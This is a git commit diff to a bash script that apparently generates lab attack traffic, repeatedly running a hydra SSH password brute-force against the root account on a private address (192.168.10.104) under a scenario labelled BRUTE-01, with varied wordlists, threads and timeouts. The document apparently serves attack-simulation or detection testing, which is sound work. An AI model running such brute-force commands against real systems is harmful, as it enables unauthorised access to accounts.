a73c1aab32d77904dd579c9db75acbb917f476eb
bahahamrouni <hamrounib73@gmail.com>
2026-07-16 13:26:59 +0100

    add: BRUTE-01 15-repetition automation script

--- validation/run_brute_matrix.sh
+++ validation/run_brute_matrix.sh
@@ -1,18 +1,18 @@
 #!/bin/bash
-WORDLISTS=(/tmp/wl_small.txt /tmp/wl_medium.txt /tmp/wl_large.txt)
-THREADS=(2 4)
+WORDLISTS=(/tmp/wl_small.txt /tmp/wl_medium.txt)
+THREADS=(4 8)
 
 for i in 2 3 4 5 6 7 8 9 10 12 13 15; do
-    wl=${WORDLISTS[$((RANDOM % 3))]}
+    wl=${WORDLISTS[$((RANDOM % 2))]}
     t=${THREADS[$((RANDOM % 2))]}
     echo "=== Retry rep $i/15 -- wordlist=$wl threads=$t ==="
-    python3 06_run_logger.py \
+    timeout 60 python3 06_run_logger.py \
         --scenario BRUTE-01 \
         --class brute_force \
-        --cmd "hydra -l root -P $wl -t $t ssh://192.168.10.104" \
+        --cmd "timeout 45 hydra -l root -P $wl -t $t ssh://192.168.10.104" \
         --target 192.168.10.104 \
         --note "retry rep $i/15, wordlist=$wl, threads=$t"
-    sleep 20
+    sleep 15
 done
 
 echo "RETRY DONE"
